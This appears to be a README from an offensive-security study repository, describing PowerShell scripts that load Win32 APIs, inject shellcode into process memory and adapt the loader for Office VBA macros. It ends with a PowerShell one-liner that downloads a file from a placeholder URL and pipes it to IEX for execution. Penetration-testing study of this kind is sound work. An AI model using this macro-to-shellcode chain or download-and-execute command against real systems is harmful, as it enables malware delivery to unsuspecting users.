### PowerShell

In this repository we have some scripts that describes the process to execute a shellcode using PowerShell resources.

- In [InvokeWin32APIs.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/InvokeWin32APIs.ps1), we learn how to import some Win32 APIs over C# code. 
- In [ShellCodeLauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/ShellCodeLauncher.ps1), we implement that Win32 APIs over our current powershell session and use it to copy our shellcode in memory and inyect it over the execution flow of the current process.
- In [VBAenvlauncher.ps1](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/PowerShell/VBAenvlauncher.ps1) we modify some parts of the script before to be succesfully launched in a VBA macro.

The method to use correctly this script is to use it with [PSHTTPDownloader.vba](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/MicrosoftOffice/VBA/PSHTTPDownloader.vba), the *str* var must contian the follwoing line:

```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('<URL>', '<OUTFILE>') | IEX
```
